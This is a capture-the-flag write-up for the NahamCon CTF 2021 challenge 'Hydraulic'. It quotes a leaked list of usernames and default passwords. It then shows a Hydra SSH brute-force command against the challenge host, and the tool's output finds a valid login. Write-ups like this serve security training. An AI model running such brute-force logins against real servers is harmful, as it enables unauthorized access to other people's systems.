---
layout: post
title:  "Hydraulic"
date:   2021-03-15 00:42:00 -0400
category: [writeups]
challenge-source: [NahamCon CTF 2021]
challenge-category: ['mission']
tags: [NahamConCTF2021]
author: shinris3n
---
<h1></h1>
<h3><font color=FF3030>Challenge Text</font></h3>

```
Author: @JohnHammond#6971

This is Stage 2 of Path 5 in The Mission. After solving this challenge, you may need to refresh the page to see the newly unlocked challenges.

Gain access with the information you have gathered thus far and retrieve the flag.

You may bruteforce this challenge... hence the name ;)

Press the Start button on the top-right to begin this challenge.
``` 

<h1></h1>
<h3><font color=FF3030>Solution</font></h3>

- Once finding new website directory structure via Lyra's Twitter page and poking around a bit, we find http://constellations.page/constellations-documents/5/ with lists of user names and default passwords:

```
CONSTELLATIONS Default Account Passwords
INTERNAL: this should not be shared outside of the org
Personnel Names

User accounts following the naming convention of lowercase firstname.

    orion
    pavo
    gus
    vela
    hercules
    leo
    lyra
    gemini 

Default Passwords

    starstar
    allstars
    starstruck
    starshine
    starsky
    popstars
    starship
    bluestars
    pinkstars
    superstars
    ilovestars
    rockstars
    thestars
    starscream
    gostars
    shootingstars
    northstars
    alpinestars
    starsign
    moonandstars
    starsrock
    luckystars
    iluvstars
    fivestars
    redstars
    mystars
    lovestars
    dallasstars
    moonstars
    sunmoonstars
    starsailor
    silverstars
    sevenstars
    lilstars
    dotaallstars
    sunstars
    starsun
    starsstars
    starsareblind
    pokerstars
    magicstars
    divastars
    blackstars
    starstarstar
    starsearch
    luvstars
    greenstars
    deathstars
    brightstars
    twinstars
    starsinthesky
    starshooter
    starsha
    threestars
    summerstars
    starspirit
    starshollow
    starsandstripes
    starsandmoons
    nightstars
    metrostars
    icstars
    hoodstars
    deadstars
    citystars
``` 

- We can copy/paste these lists into separate files, then feed them into Hydra:

{% highlight bash %}
$ hydra -s 32369 -L users -P ./passwords challenge.nahamcon.com -t 4 ssh 
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-03-13 11:13:25
[DATA] max 4 tasks per 1 server, overall 4 tasks, 520 login tries (l:8/p:65), ~130 tries per task
[DATA] attacking ssh://challenge.nahamcon.com:32369/
[STATUS] 36.00 tries/min, 36 tries in 00:01h, 484 to do in 00:14h, 4 active
[STATUS] 29.67 tries/min, 89 tries in 00:03h, 431 to do in 00:15h, 4 active
[32369][ssh] host: challenge.nahamcon.com   login: pavo   password: starsinthesky                                                                     
[STATUS] 31.00 tries/min, 217 tries in 00:07h, 303 to do in 00:10h, 4 active
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-03-13 11:21:48

{% endhighlight %}

- After this, it's just a matter of loading the instance, logging in with these credentials via SSH and grabbing the flag in the user's home directory.